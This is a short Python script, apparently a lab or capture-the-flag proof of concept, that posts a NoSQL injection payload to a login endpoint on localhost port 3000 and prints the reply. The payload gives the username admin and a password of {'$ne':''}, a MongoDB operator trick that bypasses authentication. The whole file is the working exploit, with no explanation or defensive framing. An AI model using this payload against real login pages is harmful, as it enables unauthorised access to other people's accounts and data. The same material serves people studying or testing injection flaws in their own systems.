import requests

port = "3000"
url = f"http://localhost:{port}"

s = requests.Session()

data = '{"username":"admin","password":{"$ne":""}}'
headers = {"Content-Type": "application/json"}

r = s.get(url)

r = s.post(url + "/login", data=data, headers=headers)

print(r.text)